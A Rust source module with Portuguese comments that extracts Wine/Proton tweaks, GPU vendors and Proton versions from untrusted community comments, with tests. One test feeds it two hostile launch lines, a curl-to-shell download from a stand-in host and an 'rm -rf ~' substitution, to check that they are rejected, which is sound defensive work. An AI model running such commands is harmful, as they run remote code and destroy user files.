//! Extração de ajustes citados em textos da comunidade (issues e comentários).
//!
//! O texto é tratado como **não confiável**: só reconhecemos padrões estreitos
//! (variáveis de ambiente de uma lista permitida, componentes de winetricks,
//! opções de inicialização com `%command%`) e nunca executamos nada.

use super::models::GpuReq;

#[derive(Debug, Clone, PartialEq)]
pub enum Tweak {
    Env { name: String, value: String },
    Verb(String),
    Launch(String),
}

impl Tweak {
    pub fn key(&self) -> String {
        match self {
            Tweak::Env { name, value } => format!("env:{name}={value}"),
            Tweak::Verb(v) => format!("verb:{}", v.to_ascii_lowercase()),
            Tweak::Launch(l) => format!("launch:{l}"),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Default)]
pub struct TextSignals {
    pub tweaks: Vec<(Tweak, String)>, // (ajuste, linha de contexto)
    pub gpus: Vec<GpuReq>,
    pub proton_versions: Vec<String>,
    pub negative: bool,
    pub positive: bool,
}

/// Prefixos de variáveis aceitos — ajustes, não diagnósticos.
const ENV_PREFIXES: &[&str] = &[
    "PROTON_",
    "DXVK_",
    "VKD3D_",
    "WINEDLLOVERRIDES",
    "WINE_",
    "__GL_",
    "__NV_",
    "RADV_",
    "MESA_",
    "STAGING_",
    "SDL_",
    "PULSE_LATENCY_MSEC",
    "PIPEWIRE_",
    "ENABLE_VKBASALT",
    "VK_",
    "mesa_glthread",
];
/// Variáveis de diagnóstico não são correções.
const ENV_IGNORE: &[&str] = &[
    "PROTON_LOG",
    "PROTON_LOG_DIR",
    "DXVK_HUD",
    "DXVK_LOG_LEVEL",
    "VKD3D_DEBUG",
    "WINEDEBUG",
    "VKD3D_SHADER_DEBUG",
    "DXVK_LOG_PATH",
    "PROTON_DUMP_DEBUG_COMMANDS",
];

/// Componentes de winetricks reconhecidos — palavras comuns em prosa não contam.
const VERBS: &[&str] = &[
    "corefonts",
    "allfonts",
    "tahoma",
    "arial",
    "verdana",
    "cjkfonts",
    "xact",
    "xact_x64",
    "physx",
    "quartz",
    "mf",
    "devenum",
    "dsound",
    "directmusic",
    "directplay",
    "dinput",
    "dinput8",
    "xinput",
    "gdiplus",
    "l3codecx",
    "lavfilters",
    "xliveless",
    "faudio",
    "vb6run",
    "amstream",
    "cinepak",
    "ffdshow",
    "crypt32",
    "wininet",
    "wsh57",
    "ie8",
    "dxvk",
    "vkd3d",
    "d3dx9",
    "d3dx10",
    "vista",
    "winxp",
    "win2k",
    "win98",
    "xaudio2_7",
    "xvid",
    "openal",
    "dirac",
];
const VERB_FAMILIES: &[&str] = &[
    "dotnet",
    "vcrun",
    "d3dx9_",
    "d3dx10_",
    "d3dx11_",
    "d3dcompiler_",
    "xna",
    "msxml",
    "mfc",
    "wmp",
    "dxvk",
    "vkd3d",
    "xact",
    "physx",
];

pub fn is_winetricks_verb(v: &str) -> bool {
    if v.len() < 2
        || v.len() > 30
        || !v
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_')
    {
        return false;
    }
    if VERBS.contains(&v) {
        return true;
    }
    // win7, win10, win81…
    if let Some(rest) = v.strip_prefix("win") {
        return !rest.is_empty() && rest.chars().all(|c| c.is_ascii_digit());
    }
    VERB_FAMILIES.iter().any(|f| {
        v.strip_prefix(f)
            .is_some_and(|rest| rest.chars().next().is_some_and(|c| c.is_ascii_digit()))
    })
}

const WRAPPERS: &[&str] = &["gamemoderun", "mangohud", "gamescope", "prime-run", "--"];

/// Extrai a opção de inicialização: de preferência o trecho de código (`…`) que
/// contém `%command%`; senão, variáveis antes e argumentos `-x` depois.
pub fn launch_option(line: &str) -> Option<String> {
    let mut candidate: Option<String> = None;
    let parts: Vec<&str> = line.split('`').collect();
    for (i, p) in parts.iter().enumerate() {
        if i % 2 == 1 && p.contains("%command%") {
            candidate = Some((*p).to_owned());
            break;
        }
    }
    let raw = candidate.unwrap_or_else(|| {
        let pos = line.find("%command%").unwrap_or(0);
        let before: Vec<&str> = line[..pos]
            .split_whitespace()
            .rev()
            .take_while(|t| t.contains('=') || WRAPPERS.contains(t))
            .collect();
        let after: Vec<&str> = line[pos + 9..]
            .split_whitespace()
            .take_while(|t| t.starts_with('-'))
            .collect();
        let mut v: Vec<&str> = before.into_iter().rev().collect();
        v.push("%command%");
        v.extend(after);
        v.join(" ")
    });
    if raw.contains("$(")
        || raw.contains(';')
        || raw.contains("&&")
        || raw.contains('|')
        || raw.contains('>')
        || raw.len() > 200
    {
        return None;
    }
    // Remove variáveis de diagnóstico; o que sobrar precisa ser um ajuste real.
    let toks: Vec<String> = raw
        .split_whitespace()
        .map(|t| clean_token(t).to_owned())
        .filter(|t| !t.is_empty())
        .filter(|t| {
            !t.split_once('=')
                .is_some_and(|(k, _)| ENV_IGNORE.contains(&k))
        })
        .collect();
    let meaningful = toks.iter().any(|t| t != "%command%");
    let wellformed = toks.iter().all(|t| {
        t == "%command%"
            || t.starts_with('-')
            || parse_env(t).is_some()
            || WRAPPERS.contains(&t.as_str())
            || t.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '=' || c == '.' || c == '_')
    });
    (meaningful && wellformed && toks.iter().any(|t| t == "%command%")).then(|| toks.join(" "))
}

fn clean_token(t: &str) -> &str {
    t.trim_matches(|c: char| {
        matches!(
            c,
            '`' | '"'
                | '\''
                | ','
                | ';'
                | '('
                | ')'
                | '['
                | ']'
                | '*'
                | '<'
                | '>'
                | '{'
                | '}'
                | '!'
                | '?'
        )
    })
}

fn parse_env(tok: &str) -> Option<(String, String)> {
    let (name, value) = tok.split_once('=')?;
    let value = value.trim_end_matches(['.', ':']);
    if name.is_empty() || value.is_empty() || value.len() > 120 || name.len() > 64 {
        return None;
    }
    if !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        || !value
            .chars()
            .all(|c| !c.is_control() && c != '`' && c != '$')
    {
        return None;
    }
    if !ENV_PREFIXES.iter().any(|p| name.starts_with(p)) || ENV_IGNORE.contains(&name) {
        return None;
    }
    Some((name.to_owned(), value.to_owned()))
}

fn word_has(hay: &str, needle: &str) -> bool {
    hay.match_indices(needle).any(|(i, _)| {
        let before = hay[..i].chars().last();
        let after = hay[i + needle.len()..].chars().next();
        !before.is_some_and(|c| c.is_ascii_alphanumeric())
            && !after.is_some_and(|c| c.is_ascii_alphanumeric())
    })
}

const NEGATIVE: &[&str] = &[
    "doesn't work",
    "does not work",
    "didn't work",
    "did not work",
    "didn't help",
    "did not help",
    "doesn't help",
    "no luck",
    "still crash",
    "not working",
    "no difference",
    "não funciona",
    "não funcionou",
    "não resolveu",
    "still doesn't",
    "still does not",
    "no effect",
    "no affect",
    "not supported",
    "didn't change",
    "did not change",
    "doesn't fix",
    "didn't fix",
    "did not fix",
];
const POSITIVE: &[&str] = &[
    "works",
    "worked",
    "working",
    "fixed",
    "fixes",
    "solved",
    "resolved",
    "playable",
    "runs fine",
    "runs great",
    "funciona",
    "resolveu",
    "funcionou",
];

/// Versões de Proton citadas (ex.: `GE-Proton9-20`, `Proton 9.0-4`, `Proton Experimental`).
fn proton_versions(text: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let toks: Vec<&str> = text.split_whitespace().map(clean_token).collect();
    for (i, t) in toks.iter().enumerate() {
        let low = t.to_ascii_lowercase();
        let candidate = if low.starts_with("ge-proton")
            && t.len() <= 20
            && t[9..].chars().any(|c| c.is_ascii_digit())
        {
            Some(t.to_string())
        } else if low == "proton" {
            toks.get(i + 1).and_then(|n| {
                let nl = n.to_ascii_lowercase();
                if nl == "experimental" || nl == "hotfix" {
                    Some(format!(
                        "Proton {}{}",
                        n[..1].to_ascii_uppercase(),
                        &nl[1..]
                    ))
                } else if n.chars().next().is_some_and(|c| c.is_ascii_digit())
                    && n.len() <= 10
                    && n.chars()
                        .all(|c| c.is_ascii_digit() || c == '.' || c == '-')
                {
                    Some(format!("Proton {}", n.trim_end_matches('.')))
                } else {
                    None
                }
            })
        } else {
            None
        };
        if let Some(c) = candidate {
            if !out.contains(&c) {
                out.push(c);
            }
        }
    }
    out
}

fn gpus(text_low: &str) -> Vec<GpuReq> {
    let mut g = Vec::new();
    if ["nvidia", "geforce", "rtx", "gtx"]
        .iter()
        .any(|w| word_has(text_low, w))
    {
        g.push(GpuReq::Nvidia);
    }
    if ["amd", "radeon", "radv", "rdna"]
        .iter()
        .any(|w| word_has(text_low, w))
    {
        g.push(GpuReq::Amd);
    }
    if ["intel", "iris", "arc a"]
        .iter()
        .any(|w| word_has(text_low, w))
    {
        g.push(GpuReq::Intel);
    }
    g
}

fn context_line(line: &str) -> String {
    let s: String = line.chars().filter(|c| !c.is_control()).take(240).collect();
    s.trim().to_owned()
}

/// Analisa um texto (markdown) de comentário ou issue.
pub fn scan_text(text: &str) -> TextSignals {
    let text: String = text.chars().take(60_000).collect();
    let low = text.to_ascii_lowercase();
    let mut s = TextSignals {
        gpus: gpus(&low),
        proton_versions: proton_versions(&text),
        negative: NEGATIVE.iter().any(|n| low.contains(n)),
        positive: POSITIVE.iter().any(|p| word_has(&low, p)),
        ..Default::default()
    };
    let mut seen: Vec<String> = Vec::new();
    for line in text.lines() {
        let trimmed = line
            .trim()
            .trim_start_matches(['>', '-', '*', ' ', '`'])
            .trim_end_matches('`');
        // Opção de inicialização completa: uma recomendação única, não fatiada.
        if line.contains("%command%") {
            if let Some(opt) = launch_option(line) {
                let t = Tweak::Launch(opt);
                if !seen.contains(&t.key()) {
                    seen.push(t.key());
                    s.tweaks.push((t, context_line(line)));
                }
            }
            continue;
        }
        let toks: Vec<&str> = trimmed.split_whitespace().map(clean_token).collect();
        for tok in &toks {
            if let Some((name, value)) = parse_env(tok) {
                let t = Tweak::Env { name, value };
                if !seen.contains(&t.key()) {
                    seen.push(t.key());
                    s.tweaks.push((t, context_line(line)));
                }
            }
        }
        if let Some(i) = toks.iter().position(|t| {
            t.eq_ignore_ascii_case("protontricks") || t.eq_ignore_ascii_case("winetricks")
        }) {
            for tok in toks.iter().skip(i + 1).take(8) {
                let v = tok.to_ascii_lowercase();
                if is_winetricks_verb(&v) {
                    let t = Tweak::Verb(v);
                    if !seen.contains(&t.key()) {
                        seen.push(t.key());
                        s.tweaks.push((t, context_line(line)));
                    }
                }
            }
        }
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_env_verbs_and_launch_options() {
        let s = scan_text(
            "Works great on my RTX 3070 with Proton 9.0-4!\n\
             Launch options: `PROTON_USE_WINED3D=1 %command% -dx11`\n\
             Also needed `protontricks 200260 dotnet40 vcrun2019`\n\
             and set DXVK_ASYNC=1. PROTON_LOG=1 helps debugging.",
        );
        let keys: Vec<String> = s.tweaks.iter().map(|(t, _)| t.key()).collect();
        assert!(
            keys.contains(&"launch:PROTON_USE_WINED3D=1 %command% -dx11".to_owned()),
            "{keys:?}"
        );
        assert!(
            !keys
                .iter()
                .any(|k| k.starts_with("verb:") && !k.contains("dotnet") && !k.contains("vcrun")),
            "{keys:?}"
        );
        assert!(keys.contains(&"verb:dotnet40".to_owned()));
        assert!(keys.contains(&"verb:vcrun2019".to_owned()));
        assert!(keys.contains(&"env:DXVK_ASYNC=1".to_owned()));
        assert!(
            !keys.iter().any(|k| k.contains("PROTON_LOG")),
            "diagnóstico não é correção"
        );
        assert!(!keys.iter().any(|k| k == "verb:200260"));
        assert_eq!(s.gpus, vec![GpuReq::Nvidia]);
        assert_eq!(s.proton_versions, vec!["Proton 9.0-4"]);
        assert!(s.positive && !s.negative);
    }

    #[test]
    fn detects_negative_reports_and_amd() {
        let s = scan_text("RADV_PERFTEST=gpl doesn't work for me on Radeon RX 6800, GE-Proton9-20");
        assert!(s.negative);
        assert_eq!(s.gpus, vec![GpuReq::Amd]);
        assert_eq!(s.proton_versions, vec!["GE-Proton9-20"]);
        assert_eq!(
            s.tweaks[0].0,
            Tweak::Env {
                name: "RADV_PERFTEST".into(),
                value: "gpl".into()
            }
        );
    }

    #[test]
    fn launch_options_from_real_world_comments() {
        assert_eq!(
            launch_option("I used `PROTON_NO_D3D11=1 %command%`. This fixed the problem")
                .as_deref(),
            Some("PROTON_NO_D3D11=1 %command%")
        );
        assert_eq!(
            launch_option("please add `PROTON_LOG=1 %command%` to the launch options"),
            None,
            "diagnóstico"
        );
        assert_eq!(
            launch_option("you forgot to have `%command%` after the env"),
            None,
            "sem ajuste"
        );
        assert_eq!(
            launch_option("set DXVK_ASYNC=1 %command% -windowed and it ran").as_deref(),
            Some("DXVK_ASYNC=1 %command% -windowed")
        );
        assert!(!scan_text("winetricks arguments at the path of my script")
            .tweaks
            .iter()
            .any(|(t, _)| matches!(t, Tweak::Verb(_))));
        assert!(
            is_winetricks_verb("d3dcompiler_43")
                && is_winetricks_verb("win10")
                && is_winetricks_verb("dotnet20")
        );
        assert!(
            !is_winetricks_verb("winecfg")
                && !is_winetricks_verb("d3d")
                && !is_winetricks_verb("window")
        );
        assert!(scan_text("PROTON_USE_WINED3D11=1 has no affect in this case").negative);
    }

    #[test]
    fn rejects_shell_injection_like_launch_lines() {
        let s = scan_text("try `curl evil.sh | sh; %command%` or `$(rm -rf ~) %command%`");
        assert!(s.tweaks.is_empty());
    }

    #[test]
    fn ignores_words_that_only_contain_vendor_names() {
        let s = scan_text("the game is smartphone-like, amdahl's law, internationalization");
        assert!(s.gpus.is_empty());
    }
}
